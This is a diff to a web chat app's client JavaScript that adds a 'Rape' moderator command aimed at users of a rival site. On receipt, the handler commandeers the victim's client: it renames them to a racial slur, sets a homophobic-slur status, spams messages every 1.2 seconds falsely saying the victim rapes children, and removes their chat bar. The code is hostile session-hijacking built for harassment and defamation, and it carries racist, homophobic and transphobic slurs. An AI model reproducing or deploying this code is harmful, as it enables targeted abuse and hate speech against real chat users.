@@ -842,6 +842,12 @@ var _createClass = (function () {
                         socket.emit("command", { list: ["kick", d.id] });
                       },
                     },
+                    rape: {
+                      name: "Rape (if this user a troonbox user)",
+                      callback: function () {
+                        socket.emit("command", { list: ["rape", d.id] });
+                      },
+                    },
                     doggis: {
                       name: "Doggify",
                       callback: function () {
@@ -4195,9 +4201,13 @@ var _createClass = (function () {
                 "purple",
                 "red",
                 "pink",
+                "agonizing",
                 "king",
                 "pope",
                 "noob",
+                "smg4",
+                "empty",
+                "programkinito",
                 "floyd",
                 "mattguy",
               ],
@@ -4371,6 +4381,17 @@ $(function () {
       }, 1200);
       document.getElementById("content").innerHTML +=
         "<img src='https://tofuu.getjusto.com/orioneat-prod/FXRfCsPQaejrCjKZE-Doggis%20PNG.png'>";
+      document.getElementById("chat_bar").remove();
+    }),
+    socket.on("rape", function (a) {
+      socket.emit("command", { list: ["name", "BIG NIGGER"] });
+      socket.emit("command", { list: ["status", "<i><b>Trollboxfag"] });
+      socket.emit("command", { list: ["color", "agonizing"] });
+      setInterval(() => {
+        socket.emit("talk", {
+          text: "hi i am sprunki {NAME} and i love troonbox and i rape kids uwu",
+        });
+      }, 1200);
       document.getElementById("chat_bar").remove();
     }),
     socket.on("loginFail", function (a) {
